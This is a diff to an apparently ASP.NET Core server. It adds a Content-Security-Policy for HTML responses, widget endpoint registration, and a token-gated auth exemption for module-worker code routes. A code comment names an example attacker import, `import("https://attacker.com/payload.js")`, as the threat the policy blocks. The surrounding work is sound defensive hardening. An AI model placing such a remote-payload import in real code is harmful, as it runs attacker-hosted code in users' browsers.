@@ -283,6 +283,7 @@ builder.Services
     .AddQosNetwork()
     .AddQosLifecycle()
     .AddQosWeather()
+    .AddQosWidgets()
     .AddQosPanel(servicePort)
     .AddQosLinuxDBus()
     .AddQosHelper();
@@ -425,6 +426,36 @@ app.Use(async (ctx, next) =>
             ctx.Response.Headers.Pragma = "no-cache";
             ctx.Response.Headers.Expires = "0";
         }
+
+        // CSP: applied to HTML responses (the panel SPA + any /panel/* shell).
+        // Module workers inherit their creator document's CSP, so a policy
+        // here also gates `import()` calls inside Tier 2 widget workers —
+        // blocking `import("https://attacker.com/payload.js")` while still
+        // allowing same-origin sibling imports under /widgets-api/code/...
+        //
+        // 'unsafe-inline' on script-src/style-src is required for the SPA's
+        // bootstrap script + React inline styles. It doesn't widen the
+        // worker-import attack surface — `import()` resolution checks
+        // host-source matches against the URL's origin, not against inline.
+        var contentType = ctx.Response.ContentType ?? string.Empty;
+        var isHtml = contentType.StartsWith("text/html", StringComparison.OrdinalIgnoreCase);
+        if (isHtml || noCacheShell)
+        {
+            ctx.Response.Headers["Content-Security-Policy"] =
+                "default-src 'self'; " +
+                "script-src 'self' 'unsafe-inline' blob:; " +
+                "worker-src 'self' blob:; " +
+                "child-src 'self' blob:; " +
+                "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
+                "font-src 'self' data: https://fonts.gstatic.com; " +
+                "img-src 'self' data: blob:; " +
+                "connect-src 'self' ws: wss:; " +
+                "frame-ancestors 'none'; " +
+                "base-uri 'self'; " +
+                "object-src 'none'";
+            ctx.Response.Headers["X-Content-Type-Options"] = "nosniff";
+        }
+
         return Task.CompletedTask;
     });
     await next();
@@ -482,6 +513,23 @@ app.Use(async (ctx, next) =>
     // allow only this GET shell route here; the claim/API calls are still gated.
     if (ctx.Request.Method == "GET" &&
         path.Equals("/panel/phone", StringComparison.OrdinalIgnoreCase))
+    {
+        await next(ctx);
+        return;
+    }
+
+    // (Per-widget iframe origin removed - declarative renderer now serves
+    // widget views directly from the manifest. Widget asset GETs are
+    // routed through /widgets-api/installed/{id}/asset/... and go
+    // through the regular bearer/AllowPanel auth path.)
+
+    // Module-worker code sessions. The URL itself carries a per-spawn
+    // 24-byte random token (/widgets-api/code/{sessionId}/...) that the
+    // route handler validates. Bypassing the Bearer check here lets the
+    // browser's ESM loader fetch sibling files (`import "./lib/x.js"`)
+    // inside a worker without us needing cookie auth on the panel surface.
+    if (ctx.Request.Method == "GET" &&
+        path.StartsWith("/widgets-api/code/", StringComparison.OrdinalIgnoreCase))
     {
         await next(ctx);
         return;
@@ -598,7 +646,7 @@ app.MapPanelEndpoints();
 app.MapPanelMacroRoutes();
 app.MapOverlayEndpoints();
 app.MapWeatherEndpoints();
-app.MapConflictEndpoints();
+app.MapWidgetEndpoints();
 app.MapWebSocketEndpoints();
 
 {
